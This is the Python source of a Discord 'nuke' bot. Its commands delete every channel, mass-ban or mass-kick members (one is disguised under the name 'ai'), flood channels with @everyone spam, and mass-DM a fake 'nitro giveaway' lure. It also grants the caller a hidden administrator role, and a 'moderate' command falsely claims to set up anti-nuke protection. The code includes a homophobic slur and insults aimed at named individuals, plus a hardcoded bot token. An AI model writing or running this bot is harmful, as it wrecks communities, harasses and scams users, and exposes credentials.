import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import random

CHANNEL_NAMES = "fuck james"

MESSAGE_CONTENTS = ["all my homies hate dash @everyone"]
MESSAGE_CONTENTS = ["all my homies hate juju @everyone"]

client = commands.Bot(command_prefix= '/')

client.remove_command("help")


@client.event
async def on_ready():
    print ("sums boutta get hit")
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game("boom :dancer:"))

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))



@client.command()
async def mention(ctx, amount=10000000000000000000000000):
    await ctx.message.delete()
    if not amount is None:
        for _ in range(amount):
            for channel in ctx.guild.text_channels:
              await channel.send(random.choice(MESSAGE_CONTENTS))
    else:
        while True:
            for channel in ctx.guild.text_channels: 
              await channel.send(random.choice(MESSAGE_CONTENTS))

@client.command()
async def nuke(ctx, amount=1000000):
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
                print (channel.name + " has been deleted")
            except:
                pass          
        guild = ctx.message.guild
        for member in list(ctx.message.guild.members):
            try:
                await guild.ban(member)
                print (member.name + " has been banned")
            except:
                pass
        print ("Banning Finished.")


        await ctx.guild.edit(name="dash is gay")
        channel = await guild.create_text_channel(CHANNEL_NAMES),
        for _ in range(amount):
            await guild.create_text_channel(CHANNEL_NAMES)          
        if not amount is None:
         for _ in range(amount):
             for channel in ctx.guild.text_channels:
                await channel.send(random.choice(MESSAGE_CONTENTS))  
         else:
           while True:
             for channel in ctx.guild.text_channels: 
                await channel.send(random.choice(MESSAGE_CONTENTS))



@client.command(pass_context=True)
async def dm(ctx):
    guild = ctx.message.guild
    for member in guild.members:
     await asyncio.sleep(0)
     try:
       await member.send("Want Future GIVEAWAYS?! JOIN THIS SERVER! https://discord.gg/qNg6h9Q 5 invites = nitro  ")
       print("Sent message")
     except:
       pass


@client.command(pass_context=True)
async def ping(ctx):
	channel = ctx.message.channel
	t1 = time.perf_counter()
	await channel.trigger_typing()
	t2 = time.perf_counter()
	embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
	await channel.send(embed=embed)

@client.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    channel = ctx.message.channel
    if member is None:
        await channel.send('Please input a user.')
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))

@client.command(pass_context=True)
async def kick(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('Please input a user.')
        else:
            await channel.send(":boot: Get kicked **{}**".format(member.name))
            await member.kick()
    else:
        await channel.send('You lack permission to perform this action')

@client.command(pass_context=True)
async def ban(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('Please input a user.')
        else:
            await channel.send("Get banned **{}** faggot".format(member.name))
            await member.ban()
    else:
        await channel.send('You lack permission to perform this action')


@client.command(pass_context=True)
async def invite(ctx):
    channel = ctx.message.channel
    await channel.send("https://discordapp.com/api/oauth2/authorize?client_id=614036849958060052&permissions=8&redirect_uri=https%3A%2F%2Fdiscordapp.com%2Fapi%2Foauth2%2Ftoken&response_type=code&scope=identify%20bot")


@client.command(pass_context=True)
async def moderate(ctx):
    channel = ctx.message.channel
    embed = discord.Embed(
        colour = discord.Colour.blue()
    )
    embed.add_field(name="Anti Nuke Set Up! Now Moderating your server...", value="Anti Nuke Set Up! Now Moderating your server...")
    await channel.send(embed=embed)

@client.command(pass_context=True)
async def secret(ctx):
    member = ctx.message.author
    embed = discord.Embed(
        colour = discord.Colour.red()
    )

@client.command(pass_context=True)
async def ai(ctx):
    guild = ctx.message.guild
    for member in list(ctx.message.guild.members):
        try:    
            await guild.kick(member)
            print ("User " + member.name + " has been kicked")
        except:
            pass
    print ("Action Completed: kickall")

@client.command(pass_context=True)
async def banall(ctx):
    guild = ctx.message.guild
    for member in list(ctx.message.guild.members):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action Completed: banall")



@client.command(pass_context=True)
async def admin(ctx):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    await guild.create_role(name='.', permissions=perms)
    member = ctx.message.author
    role = discord.utils.get(guild.roles, name=".")
    await member.add_roles(role)
    print ("Admin has been given!")

client.run ("NzUwNzM5MDg3MTQ0NjQ4Nzk2.X0-6Qg.BlO5SE-LUilcvpKxci9Ll2CY-m8")